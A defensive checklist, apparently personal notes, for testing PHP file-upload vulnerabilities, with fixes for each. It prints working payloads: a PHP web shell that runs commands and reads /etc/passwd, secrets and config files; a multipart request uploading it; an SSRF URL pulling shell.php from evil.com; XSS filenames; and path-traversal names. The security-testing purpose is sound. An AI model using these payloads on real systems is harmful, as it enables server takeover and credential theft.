Whenever there is file upload, there could be vulnerabilities.

This is especially true if using PHP for file upload, although similar vulnerabilities are not limited to PHP. For this checklist, we will use PHP.

What is vulnerable on your local development may not on the server and vice versa. You want to check against the server. And when you migrate to another server, you need to that test that server as well. This depends on the vulnerability you patch of course (eg. file extension validation can happen at the code level and is independent of the OS)

Fundamentals:
- Separating into an upload form and upload endpoint still doesn't make you more secured: You could have a PHP upload form that both display the upload form as well as handle the uploads saving them to the server storage, or you could have the PHP upload form submit the files to another PHP endpoint. The hacker can still sniff the endpoint that the upload form requests to.
- RCE stands for remote code execution. Remote code execution = hacker visits a script to run code. Usually this script has been forcefully placed into the server because of an exploit. That script could be php or whatever format that the server supports. The script usually has access to the system server files, eg. PHP by default can run shell scripts and access the storage. There are two types of RCE:
	- Predefined RCE. You uploaded a php file that you can visit directly. Upon visiting the script, specific commands are run on the script's server. Those commands have been already coded into the uploaded script.
	- Dynamic/Interactive RCE. You uploaded a php file that takes URL Search parameters. When visiting the script, you add the command as part of the URL. The commands run on the script's server.

Practice?
- If don't have an upload form, you can play with this unsecured upload form in the same environment where you would have code at (Keep the url super secret and delete once done playing!): [[Mock Practice - Upload Form]]


**How to use**:
- Turn on persistent table of contents.

---

## List of Upload Vulnerabilities

- Upload Arbitrary File Write with Path Traversal
- Upload File Type Bypass RCE (Remote code execution)
- Upload Unrestricted File Type RCE (Remote code execution)
- Upload Error with Verbose Messages
- Upload XSS via File Name

### Upload Arbitrary File Write with Path Traversal

#### **Goal:**
Check if the server lets you save a file _outside_ of `uploaded/`  from filenames that path traverses.
#### How to test:
- Try uploading a file with a **weird filename**, like:
	- `../../../test.txt`
	- `..%2F..%2F..%2Ftest.txt` (URL encoded slashes)
- After uploading, check if `test.txt` appears **outside** the `uploaded/` folder (maybe higher in the directory tree).
  
- **If File Upload dialogue not showing the vector files**: In the browse dialogue, files starting with dot . may be hidden on Mac. Press CMD+SHIFT+. to reveal dotted files. If doesn’t show in browse dialogue still, you can drag and drop the file into the “Choose File” button like here, and the file upload status will update to your vector file's filename:
  ![[Pasted image 20250507203556.png]]

#### **What to look for:**
- If file is saved **outside** `uploaded/`, **path traversal is working** — bad.
- If it stays inside `uploaded/`, **you're safe** (but still need filename sanitization). But you must check again if you move to a new environment or server in the future.
	- If the files stay in the folder which is what we want, the system likely replaced the slashes with another character (since dot is still a common character for filenames):
	  ![[Pasted image 20250507203706.png]]
#### **Why it's dangerous:**
If the hacker is familiar with your system, the hacker could path traversal into where they can upload autostart scripts, or replace credentials, etc.
- For example `/app/config/initializers/malicious.rb`  would autostart a bad ruby script, and ruby has access to your server storage and shell
  
#### **How prevent:**
Use basename() in PHP to extract only the filename:
```
$safeName = basename($_FILES['file']['name']);
```

---

### Upload File Type Bypass RCE (Remote code execution)

#### **Goal:** 
See if you can upload an **executable script** disguised as a safe file.
#### How to test:
- Create a simple PHP file (on your machine):
	```
	<?php echo "Hacked"; ?>
	```
- Save it as `hacked.php.jpg`.
- Upload it.
- Then try visiting directly for a RCE: `http://yourserver/uploaded/hacked.php.jpg`.
#### **What to look for:**
- If it downloads as an image, you're OK-ish.
- If it **executes PHP** (shows "Hacked" on the screen instead of downloading), **you have a serious security hole**!
#### **This is okay:**
![[Pasted image 20250507205336.png]]
#### **How to fix or avoid:**
You could fix in various ways. 
- One way is to have regular expression match then change all periods to hyphen except the final period (since that's the file extension). 
- Another way is to enforce strict file extension and MIME types. 
- Another way is to restrict all uploads to one folder by getting only basename, and also restricting that folder chmod from execution and in apache or nginx you can disable php execution in that folder.


### Upload Unrestricted File Type RCE (Remote code execution)

**Goal:** Check if any uploaded file is publicly accessible.
#### **How to test frontend:**

- Upload a `.php` file at the upload form and see if there are any errors
- Try browsing directly to your uploaded file at:
	- `http://yourserver/uploaded/yourfile.php`

#### **How to test backend:**

Hacker can use an API Request tool to upload the file to the backend directly. They could have sniffed the backend url when uploading files while having Network tab opened in Chrome DevTools.

Such API request tools could be:
- Insomniac
- Postman

The request could be:
```
POST /index.php HTTP/1.1  
Host: yourdomain.com  
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ  
  
------WebKitFormBoundaryXYZ  
Content-Disposition: form-data; name="files[]"; filename="https://evil.com/shell.php"  
Content-Type: application/x-php  
  
<?php system($_GET['cmd']); ?>  
------WebKitFormBoundaryXYZ--
```

Then the hacker tries browsing directly to their uploaded file at:
`http://yourserver/uploaded/yourfile.php`

#### **What to look for:**
- Whether frontend and/or backend allowed the script file through.
- If you can **view it easily**, hackers can too.
- As you know, public access is OK _for some files_ (images, etc.), but it's **dangerous for scripts** that can execute and affect the server. Visiting the script in the web browser is enough to affect the server.

#### **What could go wrong**

Say the hacker uploads a php script either through the frontend or through the backend:
```
<?php  
// If a GET parameter "cmd" is set in the URL, execute it as a shell command on the server  
// This gives full Remote Code Execution (RCE) capability to the attacker  
if (isset($_GET['cmd'])) {  
    echo "Executing command: " . $_GET['cmd'] . "<br>";  
    echo "<code>";  
    system($_GET['cmd']);  
    echo "</code>";  
    echo "<br></br>";  
}  
?>  
  
<?php   
// Outputs full PHP configuration: extensions, environment, file paths, etc.  
// Can reveal sensitive settings like file paths, loaded modules, and configuration values  
?>  
<details>  
    <summary>PHP Info</summary>  
    <?php phpinfo(); ?>  
</details>  
<br/>  
  
<?php  
// Attempt to get the value of the DB_PASSWORD environment variable  
// If your app uses env vars for secrets (common in .env files or Docker), this may leak them  
echo getenv("DB_PASSWORD");    
  
// Output the absolute path to the web root directory (e.g., /var/www/html)  
// Helps attacker understand file structure for further traversal or exploitation  
echo $_SERVER['DOCUMENT_ROOT'];   
  
// Read and display the contents of /etc/passwd — a sensitive system file on Linux/Unix  
// Not directly harmful by itself (doesn't contain passwords), but useful for reconnaissance  
echo file_get_contents('/etc/passwd');   
  
// Try to read a configuration file in the parent directory  
// Often contains sensitive data like DB usernames/passwords if the file is accessible  
echo file_get_contents('../config.php');   
  
?>
```

They can visit the script directly to echo server sensitive information:
https://yourdomain.com/sandbox/info.php

![[Pasted image 20250507210956.png]]

And they can expand PHP info for:
![[Pasted image 20250507211014.png]]

And worse, they can run ANY shell. commands (if that’s not blocked):
[https://yourdomain.com/sandbox/info.php?cmd=ls%20../../../../../../../](https://yourdomain.com/sandbox/info.php?cmd=ls%20../../../../../../../)

![[Pasted image 20250507211053.png]]

But some setups may detect that:
![[Pasted image 20250507211110.png]]
#### Solution

Block php uploads. Or only whitelist acceptable file formats. Go even further: Rename files to hashed filename if your app won't break from that (so hacker bots can't automate hack attempts uploading then visiting an uploaded file with the expected same filename).

When you restrict filetype by validating against them, make sure to restrict in **both frontend and backend**. For file extensions to blacklist or whitelist, refer to [[File extensions to blacklist or whitelist]].

### Upload Error with Verbose Messages

#### **Goal:** 
Check if errors leak sensitive server info.

#### How to test:  

- Try uploading:
	- A file larger than 5MB.
	- A file with a forbidden extension (like `.exe`).
	- Cause an intentional upload failure (kill your Wi-Fi mid-upload).

#### What to look for:
- If errors show **server paths**, **full PHP warnings**, or **raw error codes**, **they leak info to attackers**.

### Upload XSS via File Name

An attacker could upload a file named:
```
"><img src=x onerror=alert(1)>.jpg
```

If that hack is successful, then we can involve single quotes:
```
"><img src=x onerror=alert('Hacked')>.jpg
```

While you `htmlspecialchars()` the name, always be sure it’s applied everywhere the filename is echoed.


### Server-Side Request Forgery (SSRF)

Vulnerability index: [https://www.invicti.com/learn/server-side-request-forgery-ssrf/](https://www.invicti.com/learn/server-side-request-forgery-ssrf/)

At the backend, `GET` is not meant for uploading files. But careless code can let an attacker _simulate_ a file upload by misusing URL parameters in a way that **writes to the filesystem**. See [Upload - Why POST with multipart form-data is safer than GET]

This is what can happen:

uploader.php:
```
if (isset($_GET['upload_url'])) {  
	$url = $_GET['upload_url'];  
	$contents = file_get_contents($url);  
	file_put_contents("uploaded/".basename($url), $contents);  
}
```

Then hacker visits:
https://yourdomain.com/uploader.php?upload_url=https://evil.com/shell.php

Where the upload url is to their own server's shell.php that can take in shell commands (interactive RCE) or runs hard-coded shell commands (predefined RCE).

PHP by default allows PHP functions to download remote files. The setting to override to "Off" in php.ini is `allow_url_fopen` which could enable/disable access to URL objects for `file_get_contents()`, `fopen()`, `include()`, and `require()`.

Another thing that can happen. Let's say `uploader.php` is:
```
file_put_contents('uploads/' . $_GET['filename'], $_GET['content']);
```

Then the hacker could visit this endpoint to upload inline code into a php executable file:
```
https://example.com/uploader.php?filename=shell.php&content=<?php%20system($_GET['cmd']); ?>
```

Then the hacker visits https://example.com/uploaded/shell.php?cmd=whoami or whatever the url for any downloads is (for example, if uploaded an image and the website previews that image, then the hacker can inspect for the uploaded folder path). Boom - in this case, a privileged username appears. 